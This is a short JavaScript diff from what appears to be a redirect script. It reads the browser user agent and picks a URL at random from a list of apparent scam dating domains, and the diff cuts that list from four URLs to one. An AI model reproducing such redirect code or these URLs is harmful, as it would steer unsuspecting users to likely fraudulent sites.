@@ -1,11 +1,6 @@
 let agent = navigator.userAgent;
 
-const urls = [
-  'https://ohmyhoney-datingnew.life/?u=13bk60m&o=0rygz59',
-  'https://phf2hrh.ohmyhoney-datingnew.life/e6yb3el',
-  'https://phf2hrh.myromancedate-hub.top/e64gxw7',
-  'https://myromancedate-hub.top/?u=13bk60m&o=0rupv4g',
-];
+const urls = ['https://phf2hrh.ohmyhoney-datingnew.life/e6yb3el'];
 
 function getRandomIndex(max) {
   return Math.floor(Math.random() * max);
